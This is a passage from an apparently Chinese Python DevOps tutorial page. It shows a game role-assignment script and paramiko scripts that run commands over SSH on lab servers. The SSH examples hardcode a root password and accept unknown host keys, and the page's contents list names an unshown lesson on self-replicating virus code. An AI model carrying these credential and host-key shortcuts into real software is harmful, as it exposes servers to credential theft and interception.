class="keyword">for</span> i_str <span class="keyword">in</span> a_list:</span><br><span class="line">                i_list=i_str.strip().split()</span><br><span class="line">                stu_dict[<span class="built_in">int</span>(i_list[<span class="number">0</span>])] =i_list[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_random</span>(<span class="params">num,role</span>):</span><br><span class="line">	<span class="keyword">global</span> stu_dict</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,num):</span><br><span class="line">        	stu_list = stu_dict.keys()</span><br><span class="line">	        s_p = random.choice(stu_list)</span><br><span class="line">	        <span class="built_in">print</span> <span class="string">'{}的扮演者:{}'</span>.<span class="built_in">format</span>(role,stu_dict[s_p])</span><br><span class="line">        	<span class="keyword">del</span> stu_dict[s_p]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu_dict = {}</span><br><span class="line">createdict()</span><br><span class="line">p_random(<span class="number">1</span>,<span class="string">'法官'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'+++++++++++++++++++++++++++++++'</span></span><br><span class="line">num = <span class="built_in">len</span>(stu_dict)</span><br><span class="line">j_p_num=s_p_num = num/<span class="number">3</span></span><br><span class="line">p_random(j_p_num,<span class="string">'警察'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'+++++++++++++++++++++++++++++++'</span></span><br><span class="line">p_random(s_p_num,<span class="string">'杀手'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'+++++++++++++++++++++++++++++++'</span></span><br><span class="line">p_p_num=<span class="built_in">len</span>(stu_dict)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> stu_dict.values():</span><br><span class="line">	<span class="built_in">print</span> <span class="string">'平民的扮演者:{}'</span>.<span class="built_in">format</span>(i)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'+++++++++++++++++++++++++++++++'</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'法官扮演人数为 1\n警察扮演人数为 {0}\n杀手扮演人数为 {0}\n平明扮演人数为 {1}'</span>.<span class="built_in">format</span>(j_p_num,p_p_num)</span><br><span class="line"></span><br><span class="line">执行结果：</span><br><span class="line">(booboo)[root@workstation0 pythontest]<span class="comment"># python KillPeopleGame.py stu.txt</span></span><br><span class="line">法官的扮演者:汤雪磊</span><br><span class="line">+++++++++++++++++++++++++++++++</span><br><span class="line">警察的扮演者:申文涛</span><br><span class="line">警察的扮演者:陆明</span><br><span class="line">警察的扮演者:罗鑫</span><br><span class="line">警察的扮演者:胡立俊</span><br><span class="line">警察的扮演者:蒋帅</span><br><span class="line">警察的扮演者:周涛</span><br><span class="line">警察的扮演者:晏继鹏</span><br><span class="line">警察的扮演者:陆俊杰</span><br><span class="line">+++++++++++++++++++++++++++++++</span><br><span class="line">杀手的扮演者:黄威</span><br><span class="line">杀手的扮演者:杨钧</span><br><span class="line">杀手的扮演者:李硕</span><br><span class="line">杀手的扮演者:徐林</span><br><span class="line">杀手的扮演者:赖文龙</span><br><span class="line">杀手的扮演者:江传晖</span><br><span class="line">杀手的扮演者:许光哲</span><br><span class="line">杀手的扮演者:陈军甫</span><br><span class="line">+++++++++++++++++++++++++++++++</span><br><span class="line">平民的扮演者:大宝</span><br><span class="line">平民的扮演者:龙清胜</span><br><span class="line">平民的扮演者:巴荣军</span><br><span class="line">平民的扮演者:段永</span><br><span class="line">平民的扮演者:吴港</span><br><span class="line">平民的扮演者:李成鑫</span><br><span class="line">平民的扮演者:黄德鑫</span><br><span class="line">平民的扮演者:鲁祖兴</span><br><span class="line">+++++++++++++++++++++++++++++++</span><br><span class="line">法官扮演人数为 <span class="number">1</span></span><br><span class="line">警察扮演人数为 <span class="number">8</span></span><br><span class="line">杀手扮演人数为 <span class="number">8</span></span><br><span class="line">平明扮演人数为 <span class="number">8</span></span><br></pre></td></tr></tbody></table></figure>

<p>实践paramiko——编写python脚本连接到ssh服务器并远程执行命令_密码方式登录</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程服务器</span></span><br><span class="line">hostname = <span class="string">'172.25.0.11'</span></span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line"><span class="comment">#用户名</span></span><br><span class="line">username = <span class="string">'root'</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line">password = <span class="string">'uplooking'</span></span><br><span class="line"><span class="comment">#创建SSH连接日志文件（只保留前一次连接的详细日志，以前的日志会自动被覆盖）</span></span><br><span class="line">paramiko.util.log_to_file(<span class="string">'paramiko.log'</span>)</span><br><span class="line">s = paramiko.SSHClient()</span><br><span class="line"><span class="comment">#允许连接不在know_hosts文件中的主机</span></span><br><span class="line">s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"><span class="comment">#建立SSH连接</span></span><br><span class="line">s.connect(hostname,port,username,password)</span><br><span class="line">stdin,stdout,stderr = s.exec_command(<span class="string">'df -h'</span>)</span><br><span class="line"><span class="comment">#打印标准输出</span></span><br><span class="line"><span class="built_in">print</span> stdout.read()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">(booboo)[root@workstation0 pythontest]<span class="comment"># ls</span></span><br><span class="line">KillPeopleGame.py  pssh.py  stu.txt</span><br><span class="line">(booboo)[root@workstation0 pythontest]<span class="comment"># python pssh.py</span></span><br><span class="line">Filesystem             Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/mapper/rhel-root  <span class="number">8.8</span>G  927M  <span class="number">7.9</span>G  <span class="number">11</span>% /</span><br><span class="line">devtmpfs               235M     <span class="number">0</span>  235M   <span class="number">0</span>% /dev</span><br><span class="line">tmpfs                  245M     <span class="number">0</span>  245M   <span class="number">0</span>% /dev/shm</span><br><span class="line">tmpfs                  245M  <span class="number">4.4</span>M  241M   <span class="number">2</span>% /run</span><br><span class="line">tmpfs                  245M     <span class="number">0</span>  245M   <span class="number">0</span>% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/rhel-home  497M   26M  472M   <span class="number">6</span>% /home</span><br><span class="line">/dev/vda1              197M  <span class="number">1</span>10M   88M  <span class="number">56</span>% /boot</span><br><span class="line">tmpfs                   49M     <span class="number">0</span>   49M   <span class="number">0</span>% /run/user/<span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>

<p>课堂实践：要求写python脚本完成mastera、masterb、slavea、slaveb四台服务器的vim软件的安装。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程服务器</span></span><br><span class="line">hostname = [<span class="string">'172.25.0.11'</span>,<span class="string">'172.25.0.12'</span>,<span class="string">'172.25.0.13'</span>,<span class="string">'172.25.0.14'</span>]</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line"><span class="comment">#用户名</span></span><br><span class="line">username = <span class="string">'root'</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line">password = <span class="string">'uplooking'</span></span><br><span class="line"><span class="comment">#执行的命令</span></span><br><span class="line">cmd = <span class="string">'yum install -y vim'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建SSH连接日志文件（只保留前一次连接的详细日志，以前的日志会自动被覆盖）</span></span><br><span class="line">paramiko.util.log_to_file(<span class="string">'paramiko.log'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立SSH连接</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> hostname:</span><br><span class="line">	<span class="comment">#创建远程连接对象s</span></span><br><span class="line">	s = paramiko.SSHClient()</span><br><span class="line">	<span class="comment">#允许连接不在know_hosts文件中的主机</span></span><br><span class="line">	s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">	<span class="comment">#开始连接</span></span><br><span class="line">	s.connect(ip,port,username,password)</span><br><span class="line">	<span class="comment">#远程执行的命令</span></span><br><span class="line">	stdin,stdout,stderr = s.exec_command(cmd)</span><br><span class="line">	<span class="comment">#打印标准输出</span></span><br><span class="line">	<span class="built_in">print</span> stdout.read()</span><br><span class="line">	s.close()</span><br></pre></td></tr></tbody></table></figure>
</body></html>
              </div>
              <footer class="article-footer">
                <time class="article-footer-updated" datetime="2025-10-22T08:49:27.916Z" itemprop="dateModified">Last updated: 2025-10-22</time>
                <a href="/linux/0_linux_base/index.html" class="article-footer-next" title="概览"><span>Next</span><i class="fa fa-chevron-right"></i></a>
              </footer>
              
            </div>
          </div>
          <aside id="article-toc" role="navigation">
            <div id="article-toc-inner">
              <div id="carbonads" class="carbonads" style="text-align:center;font-family:'Noto Sans SC',sans-serif;">
  <span class="carbon-wrap">
    <a href="https://github.com/booboowei"
       class="carbon-img"
       target="_blank"
       rel="noopener sponsored">
      <img
        src="https://avatars2.githubusercontent.com/u/21328020?s=460&u=88cf6127c32932188f936d05636b7b0d36783ee1&v=4"
        alt="ads via Carbon"
        border="0"
        style="width:80px;height:80px;border-radius:50%;max-width:130px;"
      />
    </a>
    <a href="/about/"
       class="carbon-text"
       target="_blank"
       rel="noopener sponsored"
       style="display:block;margin-top:4px;">
      欢迎光临
    </a>
  </span>

  <!-- 日期显示 -->
  <div id="today-date" style="margin-top:12px;background:#f5f5f5;border-radius:12px;padding:10px 0;">
    <div id="weekday" style="font-size:14px;color:#555;"></div>
    <div id="day" style="font-size:36px;font-weight:bold;color:#000;"></div>
    <div id="ym" style="font-size:14px;color:#555;"></div>
    <div id="lunar" style="font-size:13px;color:#888;margin-top:4px;"></div>
  </div>

<script>
(function(){
  const now = new Date();
  const weekdays = ["星期日","星期一","星期二","星期三","星期四","星期五","星期六"];
  const year = now.getFullYear();
  const month = now.getMonth() + 1;
  const day = now.getDate();

  function toChineseNumber(num) {
    const map = {0:'〇',1:'一',2:'二',3:'三',4:'四',5:'五',6:'六',7:'七',8:'八',9:'九'};
    return String(num).split('').map(n=>map[n]).join('');
  }

  // 优先使用 Intl (现代浏览器支持农历/中国传统历)
  function getLunarByIntl(date) {
    try {
      // 获取农历的月（长格式，如 "九月" 或 "闰八月"），和日（数字）
      const monthFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', { month: 'long' });
      const dayFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', { day: 'numeric' });
      const lunarMonthText = monthFormatter.format(date); // 例如 "九月" 或 "闰八月"
      const lunarDayText = dayFormatter.format(date);     // 例如 "三十" 或 "初一"
      // 有的浏览器返回的 month 会包含 "闰" 字样，也可能返回汉字月份，需要适配
      return `农历${lunarMonthText}${lunarDayText}`;
    } catch (e) {
      return null; // 表示不支持 Intl 农历
    }
  }

  // 回退：简易本地农历算法（仅作兼容，适用于1900-2049范围）
  const lunarInfo = [0x04bd8,0x04ae0,0x0a570,0x054d5,0x0d260,0x0d950,0x16554,0x056a0,0x09ad0,0x055d2,
                     0x04ae0,0x0a5b6,0x0a4d0,0x0d250,0x1d255,0x0b540,0x0d6a0,0x0ada2,0x095b0,0x14977,
                     0x04970,0x0a4b0,0x0b4b5,0x06a50,0x06d40,0x1ab54,0x02b60,0x09570,0x052f2,0x04970,
                     0x06566,0x0d4a0,0x0ea50,0x06e95,0x05ad0,0x02b60,0x186e3,0x092e0,0x1c8d7,0x0c950,
                     0x0d4a0,0x1d8a6,0x0b550,0x056a0,0x1a5b4,0x025d0,0x092d0,0x0d2b2,0x0a950,0x0b557,
                     0x06ca0,0x0b550,0x15355,0x04da0,0x0a5b0,0x14573,0x052b0,0x0a9a8,0x0e950,0x06aa0,
                     0x0aea6,0x0ab50,0x04b60,0x0aae4,0x0a570,0x05260,0x0f263,0x0d950,0x05b57,0x056a0,
                     0x096d0,0x04dd5,0x04ad0,0x0a4d0,0x0d4d4,0x0d250,0x0d558,0x0b540,0x0b5a0,0x195a6,
                     0x095b0,0x049b0,0x0a974,0x0a4b0,0x0b27a,0x06a50,0x06d40,0x0af46,0x0ab60,0x09570,
                     0x04af5,0x04970,0x064b0,0x074a3,0x0ea50,0x06b58,0x05ac0,0x0ab60,0x096d5,0x092e0];

  function lYearDays(y){let i,sum=348;for(i=0x8000;i>0x8;i>>=1)sum+=(lunarInfo[y-1900]&i)?1:0;return sum+leapDays(y);}
  function leapDays(y){if(leapMonth(y))return(lunarInfo[y-1900]&0x10000)?30:29;else return 0;}
  function leapMonth(y){return lunarInfo[y-1900]&0xf;}
  function monthDays(y,m){return(lunarInfo[y-1900]&(0x10000>>m))?30:29;}

  function LunarFallback(objDate){
    let i, leap=0, temp=0;
    const baseDate = new Date(1900,0,31);
    let offset = Math.floor((objDate - baseDate) / 86400000);
    let year = 1900;
    // 年循环
    for (i = 1900; i < 2050 && offset > 0; i++) {
      temp = lYearDays(i);
      offset -= temp;
      year = i;
    }
    if (offset < 0) { offset += temp; year--; }
    leap = leapMonth(year);
    let isLeap = false;
    let month = 1;
    // 月循环
    for (i = 1; i <= 12 && offset > 0; i++) {
      if (leap > 0 && i === (leap + 1) && !isLeap) {
        // 进入闰月
        temp = leapDays(year);
        isLeap = true;
        i--; // stay on same month number but mark leap
      } else {
        temp = monthDays(year, i);
      }
      offset -= temp;
      if (isLeap && i === leap) { isLeap = false; }
      if (!isLeap) month++; // 非闰月时才推进月份计数
    }
    if (offset === 0 && leap > 0 && month === leap + 1) {
      // 特殊：当正好落在闰月第一天
      // month 保持，isLeap = true
    }
    if (offset < 0) { offset += temp; month--; }
    const day = offset + 1;
    // 修正 month 边界
    if (month <= 0) month = 1;
    return { year, month, day, isLeap: !!isLeap };
  }

  function getLunarDateStringFallback(y,m,d){
    const cDay=["","初一","初二","初三","初四","初五","初六","初七","初八","初九","初十",
                "十一","十二","十三","十四","十五","十六","十七","十八","十九","二十",
                "廿一","廿二","廿三","廿四","廿五","廿六","廿七","廿八","廿九","三十"];
    const cMon=["","正月","二月","三月","四月","五月","六月","七月","八月","九月","十月","冬月","腊月"];
    const lunar = LunarFallback(new Date(y, m-1, d));
    return `农历${lunar.isLeap ? '闰' : ''}${cMon[lunar.month]}${cDay[lunar.day]}`;
  }

  // 先尝试 Intl 方法
  let lunarText = getLunarByIntl(now);
  if (!lunarText) {
    // 回退本地算法
    lunarText = getLunarDateStringFallback(year, month, day);
  }

  // 输出到页面（公历 + 农历）
  document.getElementById("weekday").textContent = weekdays[now.getDay()];
  document.getElementById("day").textContent = day;
  document.getElementById("ym").textContent = `${toChineseNumber(year)}年${toChineseNumber(month)}月`;
  document.getElementById("lunar").textContent = lunarText;
})();
</script>


              <strong class="sidebar-title">Contents</strong>
              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97"><span class="toc-text">模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Module"><span class="toc-text">Module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import"><span class="toc-text">import</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#from-import"><span class="toc-text">from import</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir"><span class="toc-text">dir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">模块预编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#name%E5%B1%9E%E6%80%A7"><span class="toc-text">name属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#package"><span class="toc-text">package</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="toc-text">第三方软件安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setuptools"><span class="toc-text">setuptools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setuptools%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">setuptools的使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pip"><span class="toc-text">pip</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pip%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">pip的使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#virtualenv"><span class="toc-text">virtualenv</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#virtualenv%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">virtualenv的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-text">访问系统库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%8F%91%E5%B8%83"><span class="toc-text">虚拟环境的发布</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%B5%84%E6%96%99"><span class="toc-text">更进一步资料</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%AE%89%E8%A3%85%E5%92%8C%E7%AE%A1%E7%90%86%E5%BB%BA%E8%AE%AE"><span class="toc-text">软件包安装和管理建议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%AE%9E%E4%BE%8B-psutil%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-text">python实例-psutil系统基础信息模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B51%E2%80%94%E2%80%94virtualenv%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">Python实践1——virtualenv的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B52%E2%80%94%E2%80%94virtualenv%E4%B8%AD%E5%AE%89%E8%A3%85psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97"><span class="toc-text">Python实践2——virtualenv中安装psutil系统性能信息模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B53%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E6%80%BB%E5%A4%A7%E5%B0%8F%E5%8F%8A%E5%B7%B2%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%B0%8F"><span class="toc-text">Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF"><span class="toc-text">内存信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B54%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9FCPU%E5%88%A9%E7%94%A8%E7%8E%87"><span class="toc-text">Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CPU%E4%BF%A1%E6%81%AF"><span class="toc-text">CPU信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B55%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%A3%81%E7%9B%98%E4%BF%A1%E6%81%AF"><span class="toc-text">Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A3%81%E7%9B%98IO%E4%BF%A1%E6%81%AF"><span class="toc-text">磁盘IO信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B56%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-text">Python实践6——使用psutil系统性能信息模块获取当前系统网络信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-text">网络信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B57%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-text">Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">其他系统信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%AE%9E%E8%B7%B58%E2%80%94%E2%80%94%E4%BD%BF%E7%94%A8psutil%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">Python实践8——使用psutil系统性能信息模块获取当前系统进程信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-text">系统进程管理方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">进程信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#popen%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">popen类的使用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%AE%9E%E4%BE%8B-paramkio%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0ssh%E7%AE%A1%E7%90%86"><span class="toc-text">python实例-paramkio模块实现ssh管理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B51%E2%80%94%E2%80%94%E5%AE%89%E8%A3%85paramkio%E5%8C%85"><span class="toc-text">实践1——安装paramkio包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B52%E2%80%94%E2%80%94%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC%E8%BF%9E%E6%8E%A5%E5%88%B0ssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">实践2——编写python脚本连接到ssh服务器并远程执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%96%B9%E5%BC%8F%E7%99%BB%E5%BD%95"><span class="toc-text">密码方式登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%AF%81%E4%B9%A6%E6%96%B9%E5%BC%8F%E7%9A%84%E7%99%BB%E5%BD%95"><span class="toc-text">基于证书方式的登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-%E8%84%9A%E6%9C%AC%E5%AE%9E%E6%88%98"><span class="toc-text">python 脚本实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#for%E5%BE%AA%E7%8E%AF9-9"><span class="toc-text">for循环9*9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%BC%8F%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E6%95%B0%E6%8D%AE%EF%BC%88name%EF%BC%89"><span class="toc-text">自定义模块，加载模式，使用模块的方法，数据（name）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8subprocess%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E7%97%85%E6%AF%92%E8%87%AA%E6%88%91%E5%A4%8D%E5%88%B6"><span class="toc-text">使用subprocess模块完成病毒自我复制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8subprocess%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-text">使用subprocess模块完成批量添加用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%EF%BC%8C%E6%BF%80%E6%B4%BB%E5%92%8C%E9%80%80%E5%87%BA%EF%BC%9B%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E7%9A%84%E5%AE%89%E8%A3%85"><span class="toc-text">虚拟环境的搭建，激活和退出；第三方包的安装</span></a></li></ol></li></ol>
              <a href="#" id="article-toc-top">Back to Top</a>
            </div>
          </aside>
        </div>
      </article>
      <aside id="sidebar" role="navigation">
  <div class="inner">
    <strong class="sidebar-title">Linux 中级</strong><a href="/linux/0_linux_base/index.html" class="sidebar-link">概览</a><a href="/linux/0_linux_base/booboo_linux_base/index.html" class="sidebar-link">Linux 基础</a><a href="/linux/0_linux_base/booboo_easy_service/index.html" class="sidebar-link">Linux 简易服务</a><a href="/linux/0_linux_base/booboo_bash_shell_scripts/index.html" class="sidebar-link">Linux 脚本编程</a><a href="/linux/0_linux_base/booboo_middle_service/index.html" class="sidebar-link">Linux 进阶</a><strong class="sidebar-title">Linux 日常</strong><a href="/linux/1_linux_dayday/index.html" class="sidebar-link">概览</a><strong class="sidebar-title">Ex-Tools</strong><a href="/linux/2_excellent_tools/index.html" class="sidebar-link">概览</a><strong class="sidebar-title">LAMP</strong><a href="/linux/3_lamp/index.html" class="sidebar-link">概览</a><strong class="sidebar-title">Docker</strong><a href="/linux/4_docker/index.html" class="sidebar-link">概览</a><strong class="sidebar-title">TICK</strong><a href="/linux/5_tick/index.html" class="sidebar-link">概览</a><a href="/linux/5_tick/kapacitor/index.html" class="sidebar-link">Kapacitor</a><strong class="sidebar-title">Devops</strong><a href="/linux/6_devops/index.html" class="sidebar-link">概览</a><a href="/linux/6_devops/bootstrap/index.html" class="sidebar-link">Bootstrap</a><a href="/linux/6_devops/booboo_python/index.html" class="sidebar-link">Python 基础</a><a href="/linux/6_devops/00_python_base/index.html" class="sidebar-link">Python 进阶</a><a href="/linux/6_devops/01_python_net/index.html" class="sidebar-link">Python 网络开发</a><a href="/linux/6_devops/02_python_threads/index.html" class="sidebar-link">Python 并发编程</a><a href="/linux/6_devops/11_flask_admin/index.html" class="sidebar-link">Flask_admin</a><a href="/linux/6_devops/12_mini_project/index.html" class="sidebar-link">迷你小项目</a><strong class="sidebar-title">Git</strong><a href="/linux/7_git/index.html" class="sidebar-link">概览</a><a href="/linux/7_git/Chapter01/index.html" class="sidebar-link">Git 基础</a><a href="/linux/7_git/Chapter02/index.html" 